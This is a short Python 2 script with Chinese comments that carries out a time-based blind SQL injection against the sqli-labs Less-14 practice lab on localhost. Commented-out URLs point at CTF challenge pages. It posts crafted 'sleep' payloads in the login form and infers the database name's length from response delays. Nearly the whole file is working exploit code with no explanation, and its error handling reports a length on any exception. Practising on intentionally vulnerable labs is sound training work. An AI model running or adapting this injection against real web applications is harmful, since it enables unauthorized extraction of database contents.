# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time
import time
# ulr='http://ctf5.shiyanbar.com/web/index_3.php?id='#简单sql注入3
#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
# url='http://localhost/sqli-labs/Less-5/?id=' #sqli-lab lesson 5
url='http://localhost/sqli-labs/Less-14/?id=' #sqli-lab lesson 9
#定义语法关键字测试使用的载荷库
f = file("result.txt", "w+")
keyword = 'flag.jpg'
payload_end=",sleep(1),0) -- #/*" #终止SQL语句注释符号
password = '*/-- #'
versionlen=0
stop=False
for i in range(1,20):
    payload1_version = '-1"'+" or if(length(database())="  # 查看length（version）函数判断版本名长度 #单引号 lesson9
    #payload1_version = "1%22%20and%20if(length(database())="  # 查看length（version）函数判断版本名长度 #双引号lesson10
    try:
        payload = payload1_version + str(i) + payload_end
        print url + payload
        time1=time.time()
        postdata = dict(uname=payload, passwd=password, submit='Submit')
        # url编码
        postdata = urllib.urlencode(postdata)
        # print postdata
        # enable cookie
        req = urllib2.Request(url, postdata)
        res = urllib2.urlopen(req, data=None, timeout=3)
        time2=time.time()
        # print 'res is already '
        # text = res.read()
        # if (text.find(keyword) > -1):
        delay=time2-time1
        if ( delay> 1):
            print '数据库名长度是：', str(i)
            f.writelines('数据库名长度是：'+str(i))
            break
    except Exception, e:
        print e
        print '数据库名长度是：', str(i)
        break
f.close()
